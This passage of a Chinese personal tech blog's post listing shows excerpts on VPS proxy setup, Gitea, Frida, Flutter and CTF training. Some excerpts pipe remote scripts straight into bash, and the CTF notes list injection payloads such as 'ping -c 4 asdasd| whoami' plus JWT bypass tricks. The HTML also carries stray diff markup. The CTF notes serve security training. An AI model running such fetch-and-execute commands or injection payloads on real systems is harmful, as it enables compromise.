--gecos &#x27;Git Version Control&#x27; \   --group \   --disabled-password \   --home /home/git \   git  3. 配置12345678910111213141516mkdir -p /var/lib/gitea/&#123;custom,data,log&#125;chown -R git:git /var/lib/gitea/chmod -R 750 /var/lib/gitea/mkdir /etc/giteachown root:git /etc/giteac...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2025/09/10/%E8%BF%90%E7%BB%B4%E6%9D%82%E8%B0%88/%E9%9D%92%E9%BE%99%E9%9D%A2%E6%9D%BF%E5%BF%98%E8%AE%B0%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/" title="青龙面板忘记账号密码"><img class="post-bg" src="/img/cover/10.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="青龙面板忘记账号密码"></a></div><div class="recent-post-info"><a class="article-title" href="/2025/09/10/%E8%BF%90%E7%BB%B4%E6%9D%82%E8%B0%88/%E9%9D%92%E9%BE%99%E9%9D%A2%E6%9D%BF%E5%BF%98%E8%AE%B0%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/" title="青龙面板忘记账号密码">青龙面板忘记账号密码</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2025-09-10T06:12:00.000Z" title="发表于 2025-09-10 14:12:00">2025-09-10</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/git/">git</a></span></div><div class="content">青龙面板忘记账号密码了 阅读源码可知，使用的是sqlite 进入容器 1sudo docker exec -it ece2d /bin/sh 并且数据库保存在db目录下 1/ql/data/db/keyv.sqlite  所以我们只要把这个db拷出来打开就能找到账号密码 1sudo docker cp qinglong:/ql/data/db/keyv.sqlite /home/ubuntu/temp/  下载该sqlite打开即可得到账号密码 </div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2025/08/24/%E8%BF%90%E7%BB%B4%E6%9D%82%E8%B0%88/%E6%80%8E%E4%B9%88%E6%90%AD%E5%BB%BA%E5%B0%8F%E9%B8%A1/" title="怎么搭建小鸡"><img class="post-bg" src="/img/cover/4.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="怎么搭建小鸡"></a></div><div class="recent-post-info"><a class="article-title" href="/2025/08/24/%E8%BF%90%E7%BB%B4%E6%9D%82%E8%B0%88/%E6%80%8E%E4%B9%88%E6%90%AD%E5%BB%BA%E5%B0%8F%E9%B8%A1/" title="怎么搭建小鸡">怎么搭建小鸡</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2025-08-24T15:22:00.000Z" title="发表于 2025-08-24 23:22:00">2025-08-24</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E5%B0%8F%E9%B8%A1/">小鸡</a></span></div><div class="content">背景有小鸡了，怎么处理 ssh链接不多提 跑性能1curl -L https://gitlab.com/spiritysdx/za/-/raw/main/ecs.sh -o ecs.sh &amp;&amp; chmod +x ecs.sh &amp;&amp; bash ecs.sh 输入1 测速1bash &lt;(curl -Ls Net.Check.Place) -4  测IP1bash &lt;(curl -Ls IP.Check.Place)  开始搭建1bash &lt;(wget -qO- -o- https://github.com/233boy/sing-box/raw/main/install.sh)  输出的vless链接需要记录 输入sb 选择1添加配置 再选择3或者18 可以看到3是hy2,18是vless+reality 随便输入端口名(大于10000小于60000的) 得到hy2节点和一个新的vless+reality，也就是现在总共有三个节点 生成订阅链接Sublink Worker 按照不同节点换行，生成订阅 </div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2025/08/15/%E6%B8%97%E9%80%8F/%E6%97%A0%E6%98%9F%E7%9A%84%E6%B8%97%E9%80%8F%E4%B9%8B%E6%97%85%E9%80%9F%E6%88%90%E7%AF%87%EF%BC%88%E5%8D%81%E4%BA%94%EF%BC%89-Frida/" title="无星的渗透之旅速成篇（十五）-Frida"><img class="post-bg" src="/img/cover/1.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="无星的渗透之旅速成篇（十五）-Frida"></a></div><div class="recent-post-info"><a class="article-title" href="/2025/08/15/%E6%B8%97%E9%80%8F/%E6%97%A0%E6%98%9F%E7%9A%84%E6%B8%97%E9%80%8F%E4%B9%8B%E6%97%85%E9%80%9F%E6%88%90%E7%AF%87%EF%BC%88%E5%8D%81%E4%BA%94%EF%BC%89-Frida/" title="无星的渗透之旅速成篇（十五）-Frida">无星的渗透之旅速成篇（十五）-Frida</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2025-08-15T12:09:00.000Z" title="发表于 2025-08-15 20:09:00">2025-08-15</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E5%AE%89%E5%85%A8/">安全</a></span></div><div class="content">fridaFrida 16.7.19 Frida-Tools 13.7.1 先说版本对应关系 12frida==16.7.19frida-tools==13.7.1  建议使用16版本，17版本可能存在Java定义问题 看雪大哥记录的版本对应关系  frida-tools&#x3D;&#x3D;1.0.0 —— 12.0.0&lt;&#x3D;frida&lt;13.0.0  frida-tools&#x3D;&#x3D;1.1.0 —— 12.0.0&lt;&#x3D;frida&lt;13.0.0  frida-tools&#x3D;&#x3D;1.2.0 —— 12.1.0&lt;&#x3D;frida&lt;13.0.0  frida-tools&#x3D;&#x3D;1.2.1 —— 12.1.0&lt;&#x3D;frida&lt;13.0.0  frida-tools&#x3D;&#x3D;1.2.2 —— 12.1.0&lt;&#x3D;frida&lt;13.0.0  frida-tools&#x3D;&#x3D;1.2.3 —— 12.1.0&lt;&#x3D...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2025/07/31/%E7%A7%BB%E5%8A%A8%E7%AB%AF%E4%B9%8B%E6%97%85/%E6%97%A0%E6%98%9F%E7%9A%84Flutter%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85%EF%BC%88%E4%B8%89%EF%BC%89-Running%20Gradle%20task%20'assembleDebug'/" title="无星的Flutter学习之旅（三）-Running Gradle task 'assembleDebug'"><img class="post-bg" src="/img/cover/3.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="无星的Flutter学习之旅（三）-Running Gradle task 'assembleDebug'"></a></div><div class="recent-post-info"><a class="article-title" href="/2025/07/31/%E7%A7%BB%E5%8A%A8%E7%AB%AF%E4%B9%8B%E6%97%85/%E6%97%A0%E6%98%9F%E7%9A%84Flutter%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85%EF%BC%88%E4%B8%89%EF%BC%89-Running%20Gradle%20task%20'assembleDebug'/" title="无星的Flutter学习之旅（三）-Running Gradle task 'assembleDebug'">无星的Flutter学习之旅（三）-Running Gradle task 'assembleDebug'</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2025-07-31T07:48:00.000Z" title="发表于 2025-07-31 15:48:00">2025-07-31</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/flutter/">flutter</a></span></div><div class="content">创建demo，运行一直卡Running Gradle task &#39;assembleDebug&#39; 执行flutter run -v查看记录发现卡在kotlin-compiler-embeddable下载 代理也配了，怎么都不行 接下来我们讲讲怎么手动下载这些包 下载路径一共要下载三个东西，路径自己看log提示，版本自行替换 123https://plugins.gradle.org/m2/org/jetbrains/kotlin/kotlin-compiler-embeddable/2.0.21/kotlin-compiler-embeddable-2.0.21.jarhttps://plugins.gradle.org/m2/org/jetbrains/kotlin/kotlin-compiler-embeddable/2.0.21/kotlin-compiler-embeddable-2.0.21-sources.jarhttps://plugins.gradle.org/m2/org/jetbrains/kotlin/kotlin-compiler-embed...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2025/07/22/%E6%B8%97%E9%80%8F/%E6%97%A0%E6%98%9F%E7%9A%84%E6%B8%97%E9%80%8F%E4%B9%8B%E6%97%85%E9%80%9F%E6%88%90%E7%AF%87%EF%BC%88%E5%8D%81%E5%9B%9B%EF%BC%89-Root%E5%AE%89%E5%8D%93%E6%9C%BA%E6%8A%93%E5%8C%85/" title="无星的渗透之旅速成篇（十四）-Root安卓机抓包"><img class="post-bg" src="/img/cover/2.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="无星的渗透之旅速成篇（十四）-Root安卓机抓包"></a></div><div class="recent-post-info"><a class="article-title" href="/2025/07/22/%E6%B8%97%E9%80%8F/%E6%97%A0%E6%98%9F%E7%9A%84%E6%B8%97%E9%80%8F%E4%B9%8B%E6%97%85%E9%80%9F%E6%88%90%E7%AF%87%EF%BC%88%E5%8D%81%E5%9B%9B%EF%BC%89-Root%E5%AE%89%E5%8D%93%E6%9C%BA%E6%8A%93%E5%8C%85/" title="无星的渗透之旅速成篇（十四）-Root安卓机抓包">无星的渗透之旅速成篇（十四）-Root安卓机抓包</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2025-07-22T12:09:00.000Z" title="发表于 2025-07-22 20:09:00">2025-07-22</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E5%AE%89%E5%85%A8/">安全</a></span></div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2025/06/30/CTF/%E6%97%A0%E6%98%9F%E7%9A%84%E5%AE%89%E5%85%A8%E4%B9%8B%E6%97%85%EF%BC%88%E5%8D%81%EF%BC%89%E2%80%94%E2%80%94PHP/" title="无星的安全之旅（十）——PHP"><img class="post-bg" src="/img/cover/4.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="无星的安全之旅（十）——PHP"></a></div><div class="recent-post-info"><a class="article-title" href="/2025/06/30/CTF/%E6%97%A0%E6%98%9F%E7%9A%84%E5%AE%89%E5%85%A8%E4%B9%8B%E6%97%85%EF%BC%88%E5%8D%81%EF%BC%89%E2%80%94%E2%80%94PHP/" title="无星的安全之旅（十）——PHP">无星的安全之旅（十）——PHP</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2025-06-30T12:09:00.000Z" title="发表于 2025-06-30 20:09:00">2025-06-30</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E5%AE%89%E5%85%A8/">安全</a></span></div><div class="content">is_numeric比对是否是数字或者数字字符串 &#x3D;&#x3D;弱比较 12345$num=$_GET[&#x27;num&#x27;];if(!is_numeric($num))&#123;    echo $num;    if($num==1)  echo &#x27;flag&#123;**********&#125;&#x27;;&#125; 比较数字，竟然只比较数字 $num=1a的情况下，比到1&#x3D;1就停了 即 会截取字符串开头连续的数字部分 离谱 </div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2025/06/14/CTF/%E8%B5%A3%E9%93%B6%E6%9D%AF%E5%9F%B9%E8%AE%AD2025/" title="赣银杯赛前培训"><img class="post-bg" src="/img/cover/7.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="赣银杯赛前培训"></a></div><div class="recent-post-info"><a class="article-title" href="/2025/06/14/CTF/%E8%B5%A3%E9%93%B6%E6%9D%AF%E5%9F%B9%E8%AE%AD2025/" title="赣银杯赛前培训">赣银杯赛前培训</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2025-06-14T12:17:00.000Z" title="发表于 2025-06-14 20:17:00">2025-06-14</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E5%AE%89%E5%85%A8/">安全</a></span></div><div class="content">WEB信息收集、爆破、认证1.敏感文件泄露 a.robots.txt b.www.zip c.&#x2F;.git  2.dirsearch\dirb\3.BURP a.登录框-&gt;admin密码【登录获取flag】 b.给一个字典，爆出普通用户密码，登录后，有些权限验证方法 c.Cookie-&gt;user改为admin d.JWT验证 i.修改算法 ii.算法改为None，none iii.爆破密钥 iv.删除signature，删除签名  命令执行 1.成因 a.system(‘ping -c xxx $ip’) b.ping -c 4 192.168.0.1 c.ping -c 4 asdasd| whoami  2.分隔符 a.| &amp; i.前一条执行结果当作下一条命令的参数   cat xxx | grep xxx ii.前一条挂后台执行，直接执行下一条    ping -c 20 127.0.0.1 &amp; ls iii.[+] PID iv.ls执行结果输出 v.xxxx  ttl&#x3D;xxxx   b.||  &amp;&amp; i.||...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2025/06/08/%E8%87%AA%E5%8A%A8%E5%8C%96/%E6%97%A0%E6%98%9F%E7%9A%84%E8%87%AA%E5%8A%A8%E5%8C%96%E4%B9%8B%E6%97%85%EF%BC%88%E4%B8%83%EF%BC%89%E2%80%94%E2%80%94PlayWright%E5%8A%A0%E8%BD%BD%E6%8F%92%E4%BB%B6/" title="无星的自动化之旅（七）——PlayWright加载插件"><img class="post-bg" src="/img/cover/5.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="无星的自动化之旅（七）——PlayWright加载插件"></a></div><div class="recent-post-info"><a class="article-title" href="/2025/06/08/%E8%87%AA%E5%8A%A8%E5%8C%96/%E6%97%A0%E6%98%9F%E7%9A%84%E8%87%AA%E5%8A%A8%E5%8C%96%E4%B9%8B%E6%97%85%EF%BC%88%E4%B8%83%EF%BC%89%E2%80%94%E2%80%94PlayWright%E5%8A%A0%E8%BD%BD%E6%8F%92%E4%BB%B6/" title="无星的自动化之旅（七）——PlayWright加载插件">无星的自动化之旅（七）——PlayWright加载插件</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2025-06-08T07:27:08.000Z" title="发表于 2025-06-08 15:27:08">2025-06-08</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/PlayWright/">PlayWright</a></span></div><div class="content">背景使用playwright启动的是为一个无痕浏览器 但是我们有时候需要包含一些浏览器拓展 如何找到拓展安装地址我这里以Edge为例，其他浏览器自己搜 1C:\Users\user_name\AppData\Local\Microsoft\Edge\User Data\Default\Extensions  所有插件都在其中 可以根据拓展中展示的插件id知道插件名称 使用说明在当前项目下新建一个extensions文件夹 将拓展id文件夹放置其中 例如 1playwrightDemo\extensions\mcohilncbfahbmgdjkbpemcciiolgcge\3.41.0_0 创建browser工具类还要在当前项目下新建一个userData文件夹存放持久化数据 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354// 浏览器工具const &#123; chromium &#125; = require(&#x27;play...</div></div></div></div><nav id="pagination"><div class="pagination"><a class="extend prev" rel="prev" href="/"><i class="fas fa-chevron-left fa-fw"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/#content-inner">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/19/#content-inner">19</a><a class="extend next" rel="next" href="/page/3/#content-inner"><i class="fas fa-chevron-right fa-fw"></i></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/images/Avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">无星</div><div class="author-info-description">打工人</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">183</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">54</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">33</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/XingXiaoWu" target="_blank" title="Github"><i class="fab fa-github" style="color: #hdhfbb;"></i></a><a class="social-icon" href="https://juejin.cn/user/1503787636493886" target="_blank" title="掘金"><i class="fab fa-blogger" style="color: #hdhfbb;"></i></a><a class="social-icon" href="https://www.jianshu.com/u/fef7696741c8" target="_blank" title="简书"><i class="fas fa-blog" style="color: #hdhfbb;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/03/25/%E6%B8%97%E9%80%8F/%E6%97%A0%E6%98%9F%E7%9A%84%E6%B8%97%E9%80%8F%E4%B9%8B%E6%97%85%E9%80%9F%E6%88%90%E7%AF%87%EF%BC%88%E5%8D%81%E5%85%AD%EF%BC%89-Yakit%E7%83%AD%E5%8A%A0%E8%BD%BD%E7%9A%84%E5%87%A0%E4%B8%AA%E6%A8%A1%E6%9D%BF/" title="无星的渗透之旅速成篇（十六）-Yakit热加载的几个模板"><img src="/img/cover/7.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="无星的渗透之旅速成篇（十六）-Yakit热加载的几个模板"/></a><div class="content"><a class="title" href="/2026/03/25/%E6%B8%97%E9%80%8F/%E6%97%A0%E6%98%9F%E7%9A%84%E6%B8%97%E9%80%8F%E4%B9%8B%E6%97%85%E9%80%9F%E6%88%90%E7%AF%87%EF%BC%88%E5%8D%81%E5%85%AD%EF%BC%89-Yakit%E7%83%AD%E5%8A%A0%E8%BD%BD%E7%9A%84%E5%87%A0%E4%B8%AA%E6%A8%A1%E6%9D%BF/" title="无星的渗透之旅速成篇（十六）-Yakit热加载的几个模板">无星的渗透之旅速成篇（十六）-Yakit热加载的几个模板</a><time datetime="2026-03-25T12:09:00.000Z" title="发表于 2026-03-25 20:09:00">2026-03-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/03/17/%E8%BF%90%E7%BB%B4%E6%9D%82%E8%B0%88/Jenkins%E5%89%8D%E7%AB%AFPipeLine/" title="Jenkins前端PipeLine"><img src="/img/cover/5.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Jenkins前端PipeLine"/></a><div class="content"><a class="title" href="/2026/03/17/%E8%BF%90%E7%BB%B4%E6%9D%82%E8%B0%88/Jenkins%E5%89%8D%E7%AB%AFPipeLine/" title="Jenkins前端PipeLine">Jenkins前端PipeLine</a><time datetime="2026-03-17T06:32:00.000Z" title="发表于 2026-03-17 14:32:00">2026-03-17</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/01/14/%E7%A2%8E%E7%A2%8E%E5%BF%B5/AI%E6%8F%90%E7%A4%BA%E8%AF%8D/" title="一些有意思的AI提示词"><img src="/img/cover/8.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="一些有意思的AI提示词"/></a><div class="content"><a class="title" href="/2026/01/14/%E7%A2%8E%E7%A2%8E%E5%BF%B5/AI%E6%8F%90%E7%A4%BA%E8%AF%8D/" title="一些有意思的AI提示词">一些有意思的AI提示词</a><time datetime="2026-01-14T05:54:00.000Z" title="发表于 2026-01-14 13:54:00">2026-01-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/12/29/%E7%A2%8E%E7%A2%8E%E5%BF%B5/AI%E4%BD%BF%E6%88%91%E8%83%BD%E5%8A%9B%E4%B8%8B%E9%99%8D/" title="AI使我能力下降"><img src="/img/cover/10.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="AI使我能力下降"/></a><div class="content"><a class="title" href="/2025/12/29/%E7%A2%8E%E7%A2%8E%E5%BF%B5/AI%E4%BD%BF%E6%88%91%E8%83%BD%E5%8A%9B%E4%B8%8B%E9%99%8D/" title="AI使我能力下降">AI使我能力下降</a><time datetime="2025-12-29T05:54:00.000Z" title="发表于 2025-12-29 13:54:00">2025-12-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/12/15/%E8%BF%90%E7%BB%B4%E6%9D%82%E8%B0%88/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8cf%E7%99%BD%E5%AB%96KV%E5%AD%98%E5%82%A8/" title="如何使用cf白嫖KV存储"><img src="/img/cover/3.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="如何使用cf白嫖KV存储"/></a><div class="content"><a class="title" href="/2025/12/15/%E8%BF%90%E7%BB%B4%E6%9D%82%E8%B0%88/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8cf%E7%99%BD%E5%AB%96KV%E5%AD%98%E5%82%A8/" title="如何使用cf白嫖KV存储">如何使用cf白嫖KV存储</a><time datetime="2025-12-15T06:12:00.000Z" title="发表于 2025-12-15 14:12:00">2025-12-15</time></div></div></div></div><div class="card-widget" id="card-newest-comments"><div class="item-headline"><i class="fas fa-comment-dots"></i><span>最新评论</span></div><div class="aside-list"><span>加载中...</span></div></div><div class="card-widget card-categories"><div class="item-headline">
+            <i class="fas fa-folder-open"></i>
+            <span>分类</span>
+            <a class="card-more-btn" href="/categories/" title="查看更多">
+      <i class="fas fa-angle-right"></i></a>
           </div>
-          
-
-<script>
-  window.addEventListener('tabs:register', () => {
-    let { activeClass } = CONFIG.comments;
-    if (CONFIG.comments.storage) {
-      activeClass = localStorage.getItem('comments_active') || activeClass;
+          <ul class="card-category-list" id="aside-cat-list">
+            <li class="card-category-list-item "><a class="card-category-list-link" href="/categories/Android/"><span class="card-category-list-name">Android</span><span class="card-category-list-count">4</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/CloudFlare/"><span class="card-category-list-name">CloudFlare</span><span class="card-category-list-count">2</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/Jenkins/"><span class="card-category-list-name">Jenkins</span><span class="card-category-list-count">1</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/PlayWright/"><span class="card-category-list-name">PlayWright</span><span class="card-category-list-count">7</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/Postman/"><span class="card-category-list-name">Postman</span><span class="card-category-list-count">1</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/Vue/"><span class="card-category-list-name">Vue</span><span class="card-category-list-count">1</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/clash/"><span class="card-category-list-name">clash</span><span class="card-category-list-count">2</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/css/"><span class="card-category-list-name">css</span><span class="card-category-list-count">1</span></a></li>
+          </ul></div><div class="card-widget card-tags"><div class="item-headline"><i class="fas fa-tags"></i><span>标签</span></div><div class="card-tag-cloud"><a href="/tags/python/" style="font-size: 1.1em; color: #999">python</a> <a href="/tags/electron/" style="font-size: 1.39em; color: #99a5b5">electron</a> <a href="/tags/%E5%B0%8F%E9%B8%A1/" style="font-size: 1.1em; color: #999">小鸡</a> <a href="/tags/%E5%89%8D%E7%AB%AF/" style="font-size: 1.5em; color: #99a9bf">前端</a> <a href="/tags/react-native/" style="font-size: 1.35em; color: #99a3b1">react-native</a> <a href="/tags/iOS/" style="font-size: 1.46em; color: #99a8bc">iOS</a> <a href="/tags/nginx/" style="font-size: 1.17em; color: #999ca0">nginx</a> <a href="/tags/%E5%BE%AE%E5%89%8D%E7%AB%AF/" style="font-size: 1.25em; color: #999fa7">微前端</a> <a href="/tags/ntp/" style="font-size: 1.1em; color: #999">ntp</a> <a href="/tags/%E5%A3%B0%E7%BD%91/" style="font-size: 1.1em; color: #999">声网</a> <a href="/tags/Jenkins/" style="font-size: 1.1em; color: #999">Jenkins</a> <a href="/tags/%E9%92%93%E9%B1%BC/" style="font-size: 1.1em; color: #999">钓鱼</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size: 1.43em; color: #99a6b8">渗透</a> <a href="/tags/word/" style="font-size: 1.1em; color: #999">word</a> <a href="/tags/storybook/" style="font-size: 1.1em; color: #999">storybook</a> <a href="/tags/%E5%BE%AE%E4%BF%A1%E6%89%AB%E7%A0%81/" style="font-size: 1.1em; color: #999">微信扫码</a> <a href="/tags/%E6%8A%A5%E5%91%8A/" style="font-size: 1.14em; color: #999a9c">报告</a> <a href="/tags/flutter/" style="font-size: 1.17em; color: #999ca0">flutter</a> <a href="/tags/verdaccio/" style="font-size: 1.1em; color: #999">verdaccio</a> <a href="/tags/chrome%E6%8F%92%E4%BB%B6/" style="font-size: 1.1em; color: #999">chrome插件</a> <a href="/tags/doc/" style="font-size: 1.1em; color: #999">doc</a> <a href="/tags/vscode/" style="font-size: 1.1em; color: #999">vscode</a> <a href="/tags/Postman/" style="font-size: 1.1em; color: #999">Postman</a> <a href="/tags/Android/" style="font-size: 1.21em; color: #999da3">Android</a> <a href="/tags/git/" style="font-size: 1.17em; color: #999ca0">git</a> <a href="/tags/typescript/" style="font-size: 1.21em; color: #999da3">typescript</a> <a href="/tags/docx/" style="font-size: 1.1em; color: #999">docx</a> <a href="/tags/vue/" style="font-size: 1.32em; color: #99a2ae">vue</a> <a href="/tags/css/" style="font-size: 1.14em; color: #999a9c">css</a> <a href="/tags/react/" style="font-size: 1.1em; color: #999">react</a> <a href="/tags/BuuCTF/" style="font-size: 1.1em; color: #999">BuuCTF</a> <a href="/tags/Vue/" style="font-size: 1.1em; color: #999">Vue</a> <a href="/tags/pdf-js/" style="font-size: 1.1em; color: #999">pdf-js</a> <a href="/tags/rollup/" style="font-size: 1.1em; color: #999">rollup</a> <a href="/tags/CloudFlare/" style="font-size: 1.14em; color: #999a9c">CloudFlare</a> <a href="/tags/%E7%A2%8E%E7%A2%8E%E5%BF%B5/" style="font-size: 1.14em; color: #999a9c">碎碎念</a> <a href="/tags/PlayWright/" style="font-size: 1.28em; color: #99a0aa">PlayWright</a> <a href="/tags/egg/" style="font-size: 1.17em; color: #999ca0">egg</a> <a href="/tags/Lottie/" style="font-size: 1.1em; color: #999">Lottie</a> <a href="/tags/clash/" style="font-size: 1.17em; color: #999ca0">clash</a></div></div><div class="card-widget card-archives">
+    <div class="item-headline">
+      <i class="fas fa-archive"></i>
+      <span>归档</span>
+      <a class="card-more-btn" href="/archives/"
+            title="查看更多">
+            <i class="fas fa-angle-right"></i>
+          </a>
+    </div>
+  
+    <ul class="card-archive-list">
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2026/03/">
+            <span class="card-archive-list-date">
+              三月 2026
+            </span>
+            <span class="card-archive-list-count">2</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2026/01/">
+            <span class="card-archive-list-date">
+              一月 2026
+            </span>
+            <span class="card-archive-list-count">1</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2025/12/">
+            <span class="card-archive-list-date">
+              十二月 2025
+            </span>
+            <span class="card-archive-list-count">3</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2025/11/">
+            <span class="card-archive-list-date">
+              十一月 2025
+            </span>
+            <span class="card-archive-list-count">3</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2025/10/">
+            <span class="card-archive-list-date">
+              十月 2025
+            </span>
+            <span class="card-archive-list-count">3</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2025/09/">
+            <span class="card-archive-list-date">
+              九月 2025
+            </span>
+            <span class="card-archive-list-count">1</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2025/08/">
+            <span class="card-archive-list-date">
+              八月 2025
+            </span>
+            <span class="card-archive-list-count">2</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2025/07/">
+            <span class="card-archive-list-date">
+              七月 2025
+            </span>
+            <span class="card-archive-list-count">2</span>
+          </a>
+        </li>
+      
+    </ul>
+  </div><div class="card-widget card-webinfo"><div class="item-headline"><i class="fas fa-chart-line"></i><span>网站信息</span></div><div class="webinfo"><div class="webinfo-item"><div class="item-name">文章数目 :</div><div class="item-count">183</div></div><div class="webinfo-item"><div class="item-name">运行时间 :</div><div class="item-count" id="runtimeshow" data-publishDate="2016-12-12T02:23:12.000Z"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">本站访客数 :</div><div class="item-count" id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">本站总浏览量 :</div><div class="item-count" id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">最后更新时间 :</div><div class="item-count" id="last-push-date" data-lastPushDate="2026-03-27T02:04:42.132Z"><i class="fa-solid fa-spinner fa-spin"></i></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/background.jpg);"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2016 - 2026 By 无星</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.1</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.4</a></span></div><div class="footer_custom_text">歪比巴卜</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" 